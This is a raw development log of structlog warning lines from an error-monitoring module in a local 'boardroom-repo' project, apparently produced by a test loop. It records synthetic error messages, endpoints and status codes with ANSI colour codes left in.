WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.927900Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4458'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m458[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.927949Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4459'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m459[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.927998Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4460'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m460[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.928048Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4461'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m461[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.928097Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4462'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m462[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.928145Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4463'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m463[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.928193Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4464'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m464[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.928241Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4465'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m465[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.928290Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4466'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m466[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.928343Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4467'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m467[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.928398Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4468'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m468[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.928450Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4469'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m469[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.928501Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4470'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m470[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.928551Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4471'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m471[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.928601Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4472'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m472[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.928651Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4473'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m473[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.928701Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4474'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m474[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.928749Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4475'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m475[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.928798Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4476'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m476[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.928847Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4477'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m477[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.928896Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4478'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m478[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.928944Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4479'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m479[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.928992Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4480'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m480[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.929041Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4481'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m481[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.929090Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4482'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m482[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.929139Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4483'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m483[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.929187Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4484'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m484[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.929236Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4485'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m485[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.929284Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4486'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m486[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.929331Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4487'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m487[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.929379Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4488'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m488[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.929480Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4489'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m489[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.929551Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4490'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m490[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.929607Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4491'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m491[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.929659Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4492'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m492[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.929709Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4493'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m493[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.929758Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4494'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m494[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.929807Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4495'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m495[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.929855Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4496'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m496[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.929907Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4497'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m497[0m
